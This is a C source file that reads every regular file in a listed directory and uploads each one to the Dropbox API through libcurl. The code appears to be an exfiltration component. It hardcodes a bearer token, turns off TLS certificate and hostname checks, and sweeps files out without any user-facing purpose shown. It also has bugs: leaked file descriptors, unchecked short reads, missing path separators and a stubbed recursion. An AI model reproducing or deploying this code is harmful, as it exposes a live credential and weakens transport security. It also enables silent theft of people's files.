#include "common.h"

static upload_file	*map_file(char *file)
{
	struct stat	st;
	int			fd = 0, ret = 0;
	upload_file	*up = NULL;

	// Open file
	fd = open(file, O_RDONLY);
	if (fd == -1) {
		return (NULL);
	}

	// fstat to get size
	if (fstat(fd, &st) == -1) {
		return (NULL);
	}

	// Alloc struct on heap
	up = (upload_file *)calloc(sizeof(upload_file), 1);
	if (up == NULL) {
		return (NULL);
	}

	// store size and alloc space to store file content
	up->size = st.st_size;
	up->data = (char *)calloc(sizeof(char), up->size);
	if (up->data == NULL) {
		free(up);
		up = NULL;
		return (NULL);
	}

	// read file int data
	ret = read(fd, up->data, up->size);
	if (ret == -1) {
		free(up->data);
		up->data = NULL;
		free(up);
		up = NULL;
		return (NULL);
	}

	close(fd);

	return (up);
}

static void	upload(char *file)
{
	CURL				*curl;
	CURLcode			res;
	struct curl_slist	*chunk = NULL;
	upload_file			*up = NULL;

	curl = curl_easy_init();

	up = map_file(file);
	if (up == NULL) {
		return ;
	}

	if(curl) {
		// append all header
		chunk = curl_slist_append(chunk, "Authorization: Bearer _G3bZFuCKiAAAAAAAAAADbubss3eXFcWBIJb5awT7_zNVKUuh68WHN_G8BHsPbpc");
		chunk = curl_slist_append(chunk, "Dropbox-API-Arg: {\"path\": \"/filename.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}");
		chunk = curl_slist_append(chunk, "Content-Type: application/octet-stream");

		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);

		// data to send (set size and content)
		curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, up->size);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, up->data);

		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

		curl_easy_setopt(curl, CURLOPT_URL, "https://content.dropboxapi.com/2/files/upload");

		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); 			// skipping cert. verification, if needed
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); 			// skipping hostname verification, if needed

		// Perform the request, res will get the return code
		res = curl_easy_perform(curl);
		// Check for errors
		if(res != CURLE_OK) {
			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
		}

		// always cleanup
		curl_easy_cleanup(curl);
	}

	free(up->data);
	up->data = NULL;
	free(up);
	up = NULL;
}

char	*upload_files(t_list_files *list)
{
	struct stat	st;
	char		*path = NULL;

	for (int i = 0; list->files[i] != NULL; i++) {
		stat(list->files[i], &st);

		if (S_ISDIR(st.st_mode)) {
			// Recursively upload files
		} else {
			path = (char *)calloc(sizeof(char), strlen(list->directory) + strlen(list->files[i]) + 1);
			if(path == NULL) {
				return (NULL);
			}

			strcat(path, list->directory);
			strcat(path, list->files[i]);

			upload(path);

			free(path);
			path = NULL;
		}

	}
	/*print_2d_array(list->files);*/

	return (NULL);
}

